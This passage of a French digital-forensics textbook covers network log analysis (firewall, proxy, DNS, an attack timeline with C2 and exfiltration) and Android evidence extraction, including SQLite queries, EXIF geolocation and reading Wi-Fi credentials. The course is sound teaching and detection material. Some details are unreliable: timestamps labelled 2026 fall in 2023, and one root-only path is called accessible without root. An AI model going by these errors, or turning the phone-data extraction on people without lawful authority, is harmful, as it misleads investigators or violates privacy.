# Date: 2026-01-15 14:28:03
\end{lstlisting}

\textbf{Constatation forensique~:}
L'email de la session TCP~5 (frame~14872) affiche l'adresse expéditrice
\texttt{contact@medequip-portugal.com} dans le champ \texttt{MAIL FROM}
mais révèle dans le champ \texttt{X-Originating-IP} l'IP
\texttt{91.XXX.XX.XX}, enregistrée en Russie selon les bases WHOIS
consultées le 20~janvier~2026. L'en-tête \texttt{Received} confirme
le transit par les serveurs Yandex.ru.
\end{boxscenario}

\subsection{Analyse de trafic FTP~: transferts de fichiers en clair}

\begin{lstlisting}[language=bash_forensique,
    caption={Reconstruction de transferts FTP depuis une capture}]
# FTP en clair (port 21 controle, 20 donnees) : tout visible
tshark -r capture.pcap -Y "ftp" \
    -T fields -e frame.time -e ftp.request.command \
    -e ftp.request.arg

# Resultat type :
# 02:20:15  USER   admin
# 02:20:16  PASS   admin123  <- mot de passe en clair !
# 02:20:17  CWD    /confidential/RH/
# 02:20:18  RETR   salaires_2026.xlsx  <- telechargement fichier confidentiel

# Extraire les fichiers transferes via FTP-DATA (port 20)
tshark -r capture.pcap --export-objects "ftp-data,/output/ftp_objects/"

# Note : FTPS (FTP over TLS) chiffre le contenu mais les commandes
# (USER, PASS, fichiers) restent potentiellement visibles si TLS
# est mal configure (certificat auto-signe, version obsolete)
\end{lstlisting}

% ============================================================================
\section{Analyse des Logs sans Capture Complète}
\label{sec:analyse-logs}
% ============================================================================

En l'absence de capture pcap (la situation la plus courante en
investigation~: le réseau n'était pas monitoré au moment de l'incident),
les logs de périphériques réseau deviennent la seule source d'information
réseau. Ils sont moins riches, mais souvent disponibles.

\subsection{Logs de pare-feu}

\begin{boxoutils}{Analyse de logs de pare-feu (format syslog/Palo Alto)}
\begin{lstlisting}[language=bash_forensique]
# Logs de pare-feu au format syslog standard
# Structure typique : timestamp src_ip dst_ip src_port dst_port action

# Extraire toutes les connexions vers une IP suspecte
grep "185.220.XX.XX" /var/log/firewall.log | \
    grep "ACCEPT\|ALLOW" | \
    awk '{print $1,$2,$3,$4,$5,$6}' | sort -k3 -n

# Calculer le volume par connexion (bytes transferes)
grep "185.220.XX.XX" /var/log/firewall.log | \
    awk '{bytes+=$NF} END {print "Total bytes:", bytes}'

# Connexions refusees (tentatives d'intrusion ou scan)
grep "DENY\|BLOCK\|DROP" /var/log/firewall.log | \
    awk '{print $5}' | sort | uniq -c | sort -rn | head -20
# Top IP sources bloquees : peut identifier un scanner

# Detecter le beaconing dans les logs pare-feu
grep "185.220.XX.XX" /var/log/firewall.log | \
    awk '{print $1}' | \
    awk 'BEGIN{FS=":"}{printf "%s%s%s\n",$1,$2,$3}' | \
    sort | uniq -c | sort -rn
# Connexions recurrentes a la meme minute -> beaconing probable
\end{lstlisting}
\end{boxoutils}

\subsection{Logs de proxy web}

\begin{boxoutils}{Analyse de logs de proxy Squid/Bluecoat}
\begin{lstlisting}[language=bash_forensique]
# Format Squid access.log :
# timestamp elapsed client action/code bytes method url

# Sites les plus consultés (volume)
awk '{print $7}' /var/log/squid/access.log | \
    awk -F/ '{print $3}' | sort | uniq -c | sort -rn | head -20

# Telechargements volumineux (potentielle exfiltration)
awk '$5 > 10000000 {print $3,$7,$5}' /var/log/squid/access.log
# -> connections > 10 Mo vers des URLs externes

# User-Agents inhabituels (malware, outils d'attaque)
awk '{print $NF}' /var/log/squid/access.log | sort | uniq -c | \
    sort -rn | grep -iv "Mozilla\|Chrome\|Firefox\|Safari"
# Resultat suspect : "python-requests/2.28.0" -> script automatise
#                    "curl/7.74.0" -> ligne de commande
#                    "Go-http-client/1.1" -> outil Go

# Connexions hors horaires de bureau
awk '$1 >= 1678668000 && $1 <= 1678675200' /var/log/squid/access.log
# (timestamps UNIX pour 00h00-02h00 le 13 mars 2026)
\end{lstlisting}
\end{boxoutils}

\subsection{Logs DNS~: reconstituer l'activité réseau par les noms}

\begin{lstlisting}[language=bash_forensique,
    caption={Analyse de logs DNS (BIND / Windows DNS)}]
# Logs de requetes DNS (BIND format)
grep "QUERY" /var/log/named/query.log | \
    awk '{print $5}' | sort | uniq -c | sort -rn | head -30

# Domaines enregistres recemment (DGA / domaines d'attaque)
# Les DGA (Domain Generation Algorithms) produisent des noms aleatoires
grep "QUERY" /var/log/named/query.log | \
    awk '{print $5}' | \
    awk -F. '{
        n = split($0, a, ".");
        label = a[n-1] "." a[n];  # domaine principal
        sub_label = a[1];          # premier sous-domaine
        if (length(sub_label) > 15) print $0  # sous-domaine long
    }'

# Volume de requetes par client (qui fait beaucoup de DNS ?)
grep "QUERY" /var/log/named/query.log | \
    awk '{print $4}' | sort | uniq -c | sort -rn | head -10
# Si une machine fait 10x plus de requetes que les autres : suspect

# Synchroniser DNS logs avec timeline systeme (Ch. 14)
# Timestamp DNS 02:14:07 -> resolution medequip-portugal.com
# Timestamp MFT 02:17:44 -> execution enc_all.ps1
# Correlation : la resolution DNS precede l'execution de 3 min 37 sec
\end{lstlisting}

% ============================================================================
\section{Corrélation Temporelle Multi-Sources}
\label{sec:correlation-temporelle}
% ============================================================================

La puissance de la forensique réseau réside dans la \textbf{corrélation}
entre les sources réseau et les sources système. Chaque source seule
est un fragment~; la corrélation révèle l'image complète.

\begin{tableaucours}{p{2.5cm}p{4.0cm}p{5.0cm}}{%
    \tableauHeader{Source} &
    \tableauHeader{Information réseau} &
    \tableauHeader{Corrélation avec Ch.~\ref{chap:for-sys}}
}
\textbf{Capture pcap} & IP, ports, contenu des sessions &
    Corrélation temporelle~: connexion TCP à 02h14:09 $\leftrightarrow$
    entrée journald SSH Accepted à 02h14:09 \\
\textbf{Logs pare-feu} & Flux autorisés/refusés, volumes &
    Corrélation volumétrique~: 45~Mo sortants à 02h19
    $\leftrightarrow$ \texttt{\$UsnJrnl} accès 847~fichiers à 02h18 \\
\textbf{Logs DNS} & Noms résolus, clients, timestamps &
    Corrélation causale~: résolution \texttt{malware.domain.com}
    à 02h13~$\to$ connexion vers cette IP à 02h14 \\
\textbf{Logs proxy} & URLs, User-Agents, volumes &
    Corrélation comportementale~: User-Agent \texttt{python-requests}
    depuis machine du comptable = inhabituel \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~15.3. Corrélation temporelle multi-sources}\end{center}

\begin{boxscenario}{Timeline réseau + système~: Opération MVOM complète}
En fusionnant la timeline système (Ch.~\ref{chap:for-sys}) avec les
sources réseau de ce chapitre, la séquence complète de l'attaque émerge~:

\begin{lstlisting}[language=bash_forensique]
# Timeline fusionnee (source en brackets)
02:13:45  [DNS log]     Resolution: update.windowscdn.net -> 185.220.XX.XX
02:14:02  [journald]    SSH Failed password from 185.220.XX.XX (x7)
02:14:09  [journald]    SSH Accepted password root from 185.220.XX.XX
02:14:09  [pcap]        TCP SYN dst=185.220.XX.XX:4444 (C2 channel)
02:16:50  [$UsnJrnl]    FileCreate: enc_all.ps1
02:17:40  [UserAssist]  powershell.exe executed
02:17:44  [Prefetch]    enc_all.ps1 executed
02:18:31  [$UsnJrnl]    847 fichiers .docx DataOverwrite (chiffrement)
02:19:05  [firewall]    ALLOW 10.0.0.15 -> 185.220.XX.XX:443 45.2MB
02:19:05  [proxy log]   POST https://update.windowscdn.net 45231400 bytes
02:19:48  [pcap]        TCP FIN 185.220.XX.XX:4444 (deconnexion C2)
\end{lstlisting}

\textbf{Reconstruction narrative}~: L'attaquant a d'abord effectué
une résolution DNS pour préparer sa connexion (02h13). Il a obtenu
un accès root par brute-force SSH (02h14). Il a immédiatement
ouvert un canal C2 (port~4444, 02h14) par lequel il a téléchargé
et exécuté le ransomware (02h16--02h18). Il a exfiltré 45~Mo de
données (vraisemblablement les fichiers avant chiffrement, 02h19)
avant de fermer la connexion C2 (02h19:48).
\end{boxscenario}

\begin{boxjuris}
\textbf{Admissibilité des logs réseau en droit camerounais}

Les logs de pare-feu, proxy et serveurs DNS constituent des ``données
informatiques'' au sens de l'art.~4 de la \loicam{2010/012}~\cite{cameroun2010a}.
Leur admissibilité en tant que preuves est soumise aux mêmes
conditions que tout artefact numérique~:
\begin{enumerate}
    \item Origine légale~: les logs doivent avoir été conservés dans
          le cadre normal de l'exploitation du réseau (art.~27
          \loicam{2024/017}~\cite{cameroun2024donnees}~: obligation de sécurité et traçabilité)~;
    \item Intégrité~: hash SHA-256 calculé au moment de la saisie~;
    \item Chaîne de custody documentée depuis le serveur jusqu'au
          tribunal~;
    \item Expert judiciaire agréé pour attester de l'authenticité
          et de l'interprétation technique.
\end{enumerate}
\end{boxjuris}

\separateur

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Notions mobilisées par les laboratoires INA-LAB-02 et INA-LAB-03}
\textbf{INA-LAB-02 (capture réseau).} Le beaconing se repère dans la table
des conversations TCP (une destination répétée) et se mesure sur les écarts
entre les paquets \texttt{SYN} successifs vers cette destination~; la
requête DNS qui précède le premier contact donne le domaine de façade. Le
suivi de flux (\emph{Follow TCP Stream}) d'une session SMTP redonne
l'enveloppe (\texttt{MAIL FROM}) et les en-têtes (\texttt{Received},
\texttt{X-Originating-IP}).

\medskip
\textbf{INA-LAB-03 (journaux sans capture).}
\begin{itemize}
    \item Un tunnel DNS se voit à des requêtes nombreuses, souvent de type
          \texttt{TXT}, dont les sous-domaines sont longs et aléatoires sous
          un même domaine~; on compte les requêtes sur ce domaine.
    \item Le volume exfiltré par un proxy se calcule en sommant le champ des
          octets envoyés des requêtes \texttt{POST} vers le site~; on
          l'exprime en Mio (1~Mio $=$ 1\,048\,576~octets).
    \item \textbf{Décalage d'horloge}~: avant de fusionner des journaux, on
          mesure l'écart de chaque horloge sur un événement commun (la même
          connexion vue par le proxy et par le pare-feu)~; on corrige ensuite
          toutes les heures de cette source de cet écart.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Position de la sonde d'abord}~: port SPAN (tout
          le switch)~; TAP WAN (tout le trafic Internet)~;
          agent hôte (tout le trafic de la machine, chiffré compris).
          Capturer au mauvais endroit~= ne rien voir.

    \item \textbf{Follow TCP Stream}~: reconstruit la session complète.
          \texttt{--export-objects http} extrait les fichiers transférés
          avec leurs hash. Calculer le SHA-256 de chaque objet et
          soumettre sur VirusTotal.

    \item \textbf{Exfiltration~:} détecter par le volume (POST
          volumineux)~; l'entropie du contenu (contenu chiffré)~;
          le ratio upload/download anormal.

    \item \textbf{Tunneling DNS}~: sous-domaines de~$>$~50~caractères~;
          volume anormal de requêtes vers un même domaine~;
          réponses TXT avec contenu binaire.

    \item \textbf{Beaconing}~: intervalles réguliers de connexion vers
          la même destination. Calculer les intervalles et leur
          distribution~: un malware produit une distribution
          quasi-normale centrée sur son intervalle~; le trafic
          légitime est aléatoire.

    \item \textbf{Logs sans capture}~: logs pare-feu (flux, volumes)~;
          proxy (URLs, User-Agents)~; DNS (domaines résolus) constituent
          des sources complémentaires indispensables quand pas de pcap.

    \item \textbf{Corrélation temporelle}~: la valeur de la forensique
          réseau vient de la croisé avec la timeline système
          (Ch.~\ref{chap:for-sys}). La convergence temporelle entre
          log DNS~$\to$ log pare-feu~$\to$ journald~$\to$
          \texttt{\$UsnJrnl} est une preuve bien plus robuste que
          chaque source isolée.

    \item \textbf{Admissibilité}~: logs réseau~= données informatiques
          (art.~4 Loi~2010/012)~; mêmes exigences~: intégrité (hash),
          custody, expert agréé.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~15.1. Position de sonde \niveaubase}]
Une entreprise de Yaoundé suspecte une exfiltration de données depuis
un poste de travail du département comptabilité. Le réseau comprend~:
un routeur Internet, un switch principal, 40~postes de travail Windows,
un serveur de fichiers, et un serveur de messagerie.
\begin{enumerate}[(a)]
    \item Où positionneriez-vous la sonde de capture pour voir tout
          le trafic Internet du poste suspect~?
    \item Pourrait-on capturer le trafic interne entre le poste suspect
          et le serveur de fichiers avec cette même sonde~? Si non, comment~?
    \item Si vous n'avez pas accès au switch pour un SPAN port, quelles
          alternatives avez-vous pour capturer le trafic~?
    \item À quel moment de l'incident est-il trop tard pour une capture
          réseau (et quelles sources de substitution utiliser)~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~15.2. Analyse de capture \niveaumoyen}]
La capture \texttt{incident\_baobab.pcap} de l'Opération BAOBAB
(Chapitre~10~(UE~SEC4031)) est disponible. \texttt{tshark -r
incident\_baobab.pcap -q -z "conv,tcp"} révèle~:
\begin{lstlisting}[language=bash_forensique]
# Extrait conversations TCP :
10.0.0.42:52341 <-> 196.200.XX.XX:443   847 pkts  2.3 MB  <->  4.1 KB
10.0.0.42:52411 <-> 196.200.XX.XX:443   848 pkts  2.3 MB  <->  4.2 KB
10.0.0.42:52478 <-> 196.200.XX.XX:443   847 pkts  2.3 MB  <->  4.1 KB
[...] (total : 47 conversations similaires)
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Quelle anomalie identifiez-vous dans ces conversations~?
          À quoi ressemble ce pattern~?
    \item Calculez l'intervalle approximatif entre les connexions.
    \item Quelles commandes tshark utiliseriez-vous pour~: (i)~extraire
          les intervalles entre connexions~; (ii)~vérifier si le
          contenu est chiffré~; (iii)~identifier le User-Agent si
          ces connexions sont HTTP/S~?
    \item Rédigez la constatation forensique correspondante (sans
          interprétation) et l'analyse avec niveau de confiance.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~15.3. Corrélation multi-sources \niveauexpert}]
Vous disposez des sources suivantes pour l'Opération NKAM~:
\begin{itemize}
    \item Capture \texttt{sotradi.pcap} (trafic réseau 14--15~janvier 2026)~;
    \item Logs pare-feu Palo Alto (30~jours)~;
    \item Logs proxy Bluecoat (30~jours)~;
    \item Logs DNS interne (30~jours)~;
    \item Image forensique E01 du poste du comptable~;
    \item Dump RAM du serveur de messagerie.
\end{itemize}
\begin{enumerate}[(a)]
    \item Construisez un plan d'investigation réseau~: dans quel ordre
          analyser ces sources~? Quelle question spécifique posez-vous
          à chaque source~?
    \item Comment corréleriez-vous temporellement les logs DNS avec
          le contenu SMTP de la capture pcap pour établir une
          chronologie de l'attaque BEC~?
    \item Appliquez la grille CRO à la décision d'extraire et d'analyser
          le contenu des pièces jointes SMTP identifiées dans la
          capture~: qui peut y accéder~? Quelle base légale cite-t-on~?
    \item Rédigez la section Constatations réseau de votre rapport,
          couvrant la période 14h00--15h00 du 15~janvier~2026.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:for-mob} (Forensique
Mobile) quitte le serveur et le réseau pour l'objet le plus présent
dans les enquêtes camerounaises~: le téléphone, avec ses applications
de messagerie et le Mobile Money. Plus loin, le Chapitre~\ref{chap:anti-for}
(Anti-Forensique et Contre-Mesures) traitera l'autre côté du miroir~:
les techniques qu'un attaquant utilise pour effacer les traces dans
les systèmes et le réseau, et comment les détecter malgré tout.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie4/P04_C16_forensique_mobile.tex
% Titre    : Forensique Mobile -- Android et iOS
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Forensique Mobile, Android et iOS}
\label{chap:for-mob}

\epigraph{%
    « Le téléphone portable est le journal intime du XXI\textsuperscript{e}
    siècle et bien plus révélateur. »%
}{Adage de la forensique mobile}

\niveauChapitre{Intermédiaire}{%
    Chapitre~9~(UE~SEC4031) (acquisition mobile~: ADB, 4~niveaux,
    iOS) indispensable. Ce chapitre couvre l'analyse post-acquisition.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre l'architecture de stockage Android~: partitions,
          systèmes de fichiers, emplacements des données applicatives.
    \item Analyser les bases de données SQLite des applications
          critiques~: SMS, WhatsApp, contacts, calendrier.
    \item Reconstruire une chronologie d'activité mobile depuis
          les journaux système Android et les métadonnées EXIF.
    \item Identifier et exploiter les artefacts de géolocalisation~:
          historique GPS, réseaux Wi-Fi, antennes GSM.
    \item Analyser les artefacts spécifiques Mobile Money (MTN MoMo,
          Orange Money) pour les fraudes financières numériques.
    \item Maîtriser les particularités forensiques d'iOS~: sauvegarde
          iTunes, données iCloud, limitations techniques.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Positionnement~: de l'extraction à l'analyse}
% ============================================================================

Le Chapitre~9~(UE~SEC4031) s'est terminé sur \texttt{adb pull /sdcard/}
et la liste des 9~commandes ADB essentielles. Ce chapitre part de là~:
vous avez l'extraction. Que contient-elle~? Où sont les preuves~? Comment
les lire, les dater, les corroborer~?

En Afrique subsaharienne, l'écrasante majorité des infractions numériques
implique un téléphone mobile plutôt qu'un ordinateur~: fraudes MoMo,
harcèlement sur WhatsApp, arnaques Facebook, SIM~swapping. Maîtriser
la forensique mobile n'est pas optionnel, c'est la compétence la
plus immédiatement utile sur le terrain camerounais.

\separateur

% ============================================================================
\section{Architecture de Stockage Android}
\label{sec:architecture-android}
% ============================================================================

\subsection{Les partitions essentielles}

Un téléphone Android typique présente plusieurs partitions dont deux
sont centrales pour la forensique~:

\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.5cm}}{%
    \tableauHeader{Partition} &
    \tableauHeader{Contenu} &
    \tableauHeader{Accessibilité forensique}
}
\texttt{/data} & Données applicatives, comptes,
    bases de données SQLite, paramètres &
    \textbf{Nécessite root ou extraction physique.}
    Contient les données les plus sensibles~: messages,
    mots de passe, tokens d'authentification. \\
\texttt{/sdcard} (\texttt{/storage/emulated/0}) &
    Photos, vidéos, téléchargements, backups WhatsApp &
    \textbf{Accessible via ADB sans root.}
    \texttt{adb pull /sdcard/} \\
\texttt{/system} & OS Android, applications système &
    Lecture seule~; peu utile en investigation courante \\
\texttt{/cache} & Cache des applications &
    Volatile~; contenu non garanti après redémarrage \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~16.1. Partitions Android et accessibilité forensique}\end{center}

\begin{boxalert}
\textbf{La limite fondamentale de l'extraction ADB sans root}

\texttt{adb pull /sdcard/} donne accès à la carte SD virtuelle
(\texttt{/storage/emulated/0}). Les données applicatives les plus
importantes (SMS, contacts, messages WhatsApp, tokens de connexion) sont dans \texttt{/data/data/<package>} et \textbf{ne sont pas
accessibles sans root}.

\textbf{Conséquence pratique~:} pour une affaire impliquant les messages
d'une application (WhatsApp, SMS, Messenger), l'extraction ADB logique
est insuffisante sauf si~: (a)~le téléphone était rooté, (b)~une
sauvegarde ADB a été activée~(\texttt{adb backup -all -shared}), ou
(c)~les backups WhatsApp ont été sauvegardés sur \texttt{/sdcard}
(comportement par défaut de WhatsApp).
\end{boxalert}

\subsection{Emplacements clés des données applicatives}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.0cm}}{%
    \tableauHeader{Application} &
    \tableauHeader{Chemin (root requis)} &
    \tableauHeader{Chemin accessible sans root}
}
SMS & \texttt{/data/data/com.android.providers.telephony/databases/mmssms.db} &
    \texttt{adb shell content query --uri content://sms/} \\
Contacts & \texttt{/data/data/com.android.providers.contacts/databases/contacts2.db} &
    \texttt{adb shell content query --uri content://contacts/} \\
WhatsApp messages & \texttt{/data/data/com.whatsapp/databases/msgstore.db} &
    \texttt{/sdcard/WhatsApp/Databases/msgstore.db.crypt15} (chiffré) \\
WhatsApp médias & \texttt{/data/data/com.whatsapp/} &
    \texttt{/sdcard/WhatsApp/Media/} (non chiffré) \\
Appels & \texttt{/data/data/com.android.providers.contacts/databases/contacts2.db} &
    \texttt{adb shell content query --uri content://call\_log/} \\
Localisation (Google) & \texttt{/data/data/com.google.android.gms/} &
    Google Timeline via réquisition (legalprocess.google.com) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~16.2. Emplacements des données applicatives}\end{center}

% ============================================================================
\section{Analyse des Bases de Données SQLite}
\label{sec:sqlite}
% ============================================================================

Les applications Android stockent la quasi-totalité de leurs données
dans des fichiers SQLite (extension \texttt{.db}). Ces bases de données
sont le c\oe ur de l'analyse forensique mobile.

\subsection{Analyser les SMS~: \texttt{mmssms.db}}

\begin{boxoutils}{Analyse de mmssms.db, base de données SMS}
\begin{lstlisting}[language=bash_forensique]
# Ouverture de la base de donnees SMS (extraite via ADB ou backup)
sqlite3 /output/extraction/mmssms.db

# Structure de la table SMS
.schema sms
-- CREATE TABLE sms (
--   _id INTEGER PRIMARY KEY,
--   thread_id INTEGER,  -- identifiant conversation
--   address TEXT,       -- numero de telephone
--   date INTEGER,       -- timestamp Unix en millisecondes
--   date_sent INTEGER,
--   protocol INTEGER,
--   read INTEGER,       -- 1=lu, 0=non lu
--   type INTEGER,       -- 1=recu, 2=envoye, 3=brouillon
--   body TEXT,          -- contenu du message
-- )

-- Tous les SMS avec horodatage lisible
SELECT
    datetime(date/1000, 'unixepoch', 'localtime') AS date_heure,
    address AS correspondant,
    CASE type
        WHEN 1 THEN 'Recu'
        WHEN 2 THEN 'Envoye'
        WHEN 3 THEN 'Brouillon'
    END AS type_sms,
    body AS contenu
FROM sms
ORDER BY date;

-- SMS contenant des mots-cles suspects
SELECT datetime(date/1000, 'unixepoch') AS date,
       address, body
FROM sms
WHERE body LIKE '%code%' OR body LIKE '%OTP%'
   OR body LIKE '%virement%' OR body LIKE '%MoMo%'
ORDER BY date;
\end{lstlisting}
\end{boxoutils}

\subsection{Analyser WhatsApp~: \texttt{msgstore.db}}

\begin{boiteRemarque}{Le déchiffrement des backups WhatsApp}
WhatsApp stocke ses backups locaux au format \texttt{msgstore.db.crypt15}
(chiffrement AES-256-GCM). La clé est stockée dans
\texttt{/data/data/com.whatsapp/files/key}, inaccessible sans root.

\textbf{Cas où le backup est analysable sans root~:}
\begin{enumerate}
    \item Téléphone \textbf{rooté}~: extraire directement \texttt{msgstore.db}
          depuis \texttt{/data/data/com.whatsapp/databases/}.
    \item \textbf{Sauvegarde ADB} (si activée)~: \texttt{adb backup
          -apk com.whatsapp} extrait l'application et ses données.
    \item \textbf{WhatsApp Web actif}~: la session Web peut révéler
          le contenu en temps réel (pas forensique, mais utile en
          surveillance légale autorisée).
    \item \textbf{Déchiffrement avec la clé extraite}~: si root obtenu
          via exploit, extraire \texttt{key} puis déchiffrer avec
          l'outil \texttt{whatsapp-viewer}.
\end{enumerate}
\end{boiteRemarque}

\begin{boxoutils}{WhatsApp, base non chiffrée (root) ou médias}
\begin{lstlisting}[language=bash_forensique]
-- Analyse de msgstore.db (WhatsApp, necesssite root ou backup)
sqlite3 /output/msgstore.db

-- Messages recus et envoyes avec horodatage
SELECT
    datetime(timestamp/1000, 'unixepoch', 'localtime') AS date_heure,
    jid AS correspondant,    -- format : 237XXXXXXXXX@s.whatsapp.net
    CASE from_me
        WHEN 0 THEN 'Recu'
        WHEN 1 THEN 'Envoye'
    END AS direction,
    data AS message_texte
FROM messages
WHERE data IS NOT NULL
ORDER BY timestamp;

-- Groupes WhatsApp et participants
SELECT
    g.subject AS nom_groupe,
    m.jid AS membre,
    datetime(m.timestamp/1000, 'unixepoch') AS date_ajout
FROM group_participants_history m
JOIN chat g ON g.jid = m.gjid
ORDER BY g.subject, m.timestamp;

-- Medias envoyes/recus (avec chemins de fichier)
SELECT
    datetime(timestamp/1000, 'unixepoch') AS date,
    jid, message_type, media_caption, local_path
FROM messages
WHERE message_type IN (1,2,3)  -- image, audio, video
ORDER BY timestamp;
\end{lstlisting}

\textbf{Médias WhatsApp accessibles sans root~:}
\begin{lstlisting}[language=bash_forensique]
# Les medias (photos, videos, documents) envoyes/recus par WhatsApp
# sont stockes en CLAIR sur /sdcard/WhatsApp/Media/
ls /mnt/extraction/WhatsApp/Media/
# WhatsApp Images/
# WhatsApp Video/
# WhatsApp Documents/
# WhatsApp Audio/

# Hash SHA-256 de tous les medias
find /mnt/extraction/WhatsApp/Media/ -type f \
    -exec sha256sum {} \; > /output/whatsapp_media_hashes.txt

# Verification sur VirusTotal (documents/APK suspects)
# Extraction des metadonnees EXIF des images
exiftool /mnt/extraction/WhatsApp/Media/WhatsApp\ Images/*.jpg \
    | grep -i "GPS\|Date\|Camera\|Make"
\end{lstlisting}
\end{boxoutils}

\subsection{Analyser les journaux d'appels}

\begin{lstlisting}[language=bash_forensique,
    caption={Extraction des journaux d'appels}]
# Via ADB content query (sans root)
adb shell content query --uri content://call_log/calls \
    --projection "number,type,date,duration,name" \
    > /output/call_log.txt

# Interpretation du champ type :
# 1 = Appel entrant
# 2 = Appel sortant
# 3 = Appel manque
# 4 = Messagerie vocale

# Analyse des appels vers un numero suspect
adb shell content query --uri content://call_log/calls \
    --where "number='23767XXXXXXX'" \
    --projection "date,type,duration"

# Convertir les timestamps
# date en millisecondes Unix -> datetime
python3 -c "
from datetime import datetime
with open('/output/call_log.txt') as f:
    for line in f:
        if 'date' in line:
            ts = int(line.split('=')[1].split(',')[0])
            print(datetime.fromtimestamp(ts/1000))
"
\end{lstlisting}

% ============================================================================
\section{Géolocalisation et Mobilité}
\label{sec:geolocalisation}
% ============================================================================

\subsection{Métadonnées EXIF des photos}

Les photos prises avec un smartphone embarquent souvent les coordonnées
GPS dans les métadonnées EXIF, une source précieuse pour établir
où se trouvait le suspect (ou la victime) à un moment donné.

\begin{boxoutils}{Extraction et visualisation des métadonnées EXIF}
\begin{lstlisting}[language=bash_forensique]
# Extraire les metadonnees GPS de toutes les photos
exiftool -csv -GPS* /mnt/extraction/DCIM/Camera/*.jpg \
    > /output/photo_gps.csv

# Contenu type du CSV :
# SourceFile,GPSLatitude,GPSLongitude,GPSAltitude,DateTimeOriginal
# IMG_20260313_021705.jpg,3.8480 N,11.5021 E,741 m,2026:03:13 02:17:05

# Convertir en format decimal pour Google Maps
exiftool -p '$GPSLatitude#,$GPSLongitude#,$DateTimeOriginal $FileName' \
    /mnt/extraction/DCIM/Camera/*.jpg

# Photo prise a 02:17:05 le 13 mars 2026 -> coordonnees GPS
# Utiliser Google Maps ou QGIS pour visualiser le trajet
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Cas MBONGO. localisation via EXIF}
L'extraction ADB du téléphone de MBONGO Joseph (EV-002,
Chapitre~8~(UE~SEC4031)) révèle 15~photos dans
\texttt{/sdcard/WhatsApp/Media/WhatsApp Images/}. L'analyse EXIF
de \texttt{IMG-20260115-WA0003.jpg} (une photo d'un relevé bancaire)
montre~:

\begin{lstlisting}[language=bash_forensique]
exiftool IMG-20260115-WA0003.jpg
# GPS Latitude   : 4 deg 2' 52.80" N    (4.0480 N)
# GPS Longitude  : 9 deg 41' 45.60" E   (9.6960 E)
# Create Date    : 2026:01:15 14:28:33
# Camera Model   : Samsung Galaxy A53
\end{lstlisting}

\textbf{Constatation~:} la photo \texttt{IMG-20260115-WA0003.jpg}
a été prise le 15~janvier~2026 à 14h28~min~33s à des coordonnées GPS
de \texttt{4.0480°N / 9.6960°E}, correspondant au quartier Akwa,
Douala (vérification sur OpenStreetMap~; l'option \texttt{exiftool -n}
affiche directement les degrés décimaux). Le suspect affirmait être à
Yaoundé ce jour-là. La date et les coordonnées sont en cohérence directe
avec l'horodatage de l'email de phishing analysé dans l'affaire WOURI
(14h28~min, même secteur géographique).
\end{boxscenario}

\subsection{Historique de localisation Google}

Google enregistre la position des appareils Android dans Google Maps
Timeline (si la fonction est activée). Ces données sont accessibles
de deux façons~:

\begin{enumerate}
    \item \textbf{Via le compte Google du suspect} (si ses identifiants
          sont connus ou si son téléphone est déverrouillé)~:
          \texttt{myactivity.google.com} ou \texttt{timeline.google.com}.
    \item \textbf{Via réquisition légale à Google}~:
          \texttt{legalprocess.google.com}, délai~: 10--30~jours~;
          base légale~: art.~57 \loicam{2010/012}~\cite{cameroun2010a} (réquisition aux
          fournisseurs de services numériques).
\end{enumerate}

\subsection{Données réseau~: Wi-Fi et antennes GSM}

\begin{boxoutils}{Artefacts réseau sur Android}
\begin{lstlisting}[language=bash_forensique]
# Historique des reseaux Wi-Fi connus (sans root)
adb shell cat /data/misc/wifi/WifiConfigStore.xml
# Ou accessible dans le backup ADB :
# /apps/com.android.providers.settings/db/settings.db

# Analyse du fichier wpa_supplicant (reseaux Wi-Fi)
# Contient : SSID, BSSID, mot de passe (hash), dates de connexion
# Chaque SSID peut etre localise via les bases BSSID publiques
# (Wigle.net, Google Maps Wi-Fi API)

# Journaux des antennes GSM (Cell ID log)
# Disponible via Google Location History (réquisition)
# Ou sur certains appareils dans /data/logger/
# Format : timestamp, MCC, MNC, LAC, Cell_ID
# Convertir Cell_ID en position via opencellid.org

# Exemple de requete OpenCelliD API
curl "https://opencellid.org/cell/get?key=YOUR_KEY
    &mcc=624&mnc=01&lac=9001&cellid=12345"
# -> latitude, longitude de l'antenne (precision : 50-1000 m)
\end{lstlisting}
\end{boxoutils}

\begin{boxjuris}
\textbf{Données de localisation et vie privée~: cadre légal camerounais}

Les données de localisation (GPS, antennes GSM, Wi-Fi) constituent des
données à caractère personnel au sens de l'art.~5 de la \loicam{2024/017}~\cite{cameroun2024donnees}
(\textit{toute information permettant d'identifier directement ou
indirectement une personne physique}). Leur collecte et traitement
en contexte forensique doivent respecter~:
\begin{itemize}
    \item Art.~52 \loicam{2010/012}~: autorisation judiciaire préalable~;
    \item Art.~57 \loicam{2010/012}~: réquisition formelle à l'opérateur~;
    \item Art.~9--11 \loicam{2024/017}~: finalité et proportionnalité.
\end{itemize}
\textbf{Point de vigilance~:} l'historique de localisation obtenu depuis
le téléphone saisi est admissible (l'appareil a été légalement saisi).
Mais demander l'historique de localisation à l'opérateur ou à Google
nécessite une réquisition judiciaire distincte.
\end{boxjuris}

% ============================================================================
\section{Artefacts Mobile Money~: MoMo, Orange Money}
\label{sec:mobile-money}
% ============================================================================

